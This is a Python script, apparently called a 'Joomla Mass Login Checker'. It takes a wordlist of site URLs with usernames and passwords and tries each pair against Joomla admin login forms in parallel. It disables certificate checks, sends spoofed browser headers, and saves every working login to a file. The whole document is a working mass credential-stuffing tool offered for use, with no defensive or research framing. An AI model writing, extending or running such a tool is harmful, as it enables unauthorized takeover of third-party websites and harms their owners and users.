import requests
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
requests.urllib3.disable_warnings()

good_count = 0
bad_count = 0

def check(txt):
    global good_count
    global bad_count

    # Check if txt contains three values separated by '#', '@'
    if '#' not in txt or '@' not in txt:
        print(f"Invalid format: {txt}")
        return

    url, username, password = txt.split("#")[0], txt.split("#")[1].split("@")[0], txt.split("@")[1]
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Content-Type': 'application/x-www-form-urlencoded'  # Added Content-Type header
    }
    data = {
        'username': username,
        'passwd': password,
        'option': 'com_login',
        'task': 'login',
        'return': f'{url}/index.php',
        'Itemid': '101',
        'lang': 'en'
    }

    try:
        response = requests.post(f'{url}/index.php', headers=headers, data=data, timeout=20, verify=False)

        if 'logout' in response.text:
            print(f'{url} --> {fg}[Success]')
            good_count += 1
            with open("joomla.txt", "a") as good_file:
                good_file.write(f'{url}#{username}@{password}\n')
        else:
            print(f'{url} --> {fr}[Failed]')
            bad_count += 1
            with open("bad.txt", "a") as bad_file:
                bad_file.write(f'{url}#{username}@{password}\n')
    except requests.exceptions.Timeout:
        print(f'{url} --> {fr}[Failed] (Timeout)')
        bad_count += 1
        with open("bad.txt", "a") as bad_file:
            bad_file.write(f'{url}#{username}@{password}\n')
    except requests.exceptions.RequestException as e:
        print(f'{url} --> {fr}[Failed] (Error: {e})')
        bad_count += 1
        with open("bad.txt", "a") as bad_file:
            bad_file.write(f'{url}#{username}@{password}\n')

def main():
    try:
        print(Fore.GREEN + 'Joomla Mass Login Checker')
        fileopen = input("Enter the wordlist file: ")
        thread = input("Thread: ")
        file = open(fileopen, 'r').read().splitlines()
        pool = Pool(int(thread))
        pool.map(check, file)
    except Exception as e:
        print(f'An error occurred: {e}')

    print("Total Good: ", good_count)
    print("Total Bad: ", bad_count)

if __name__ == "__main__":
    main()
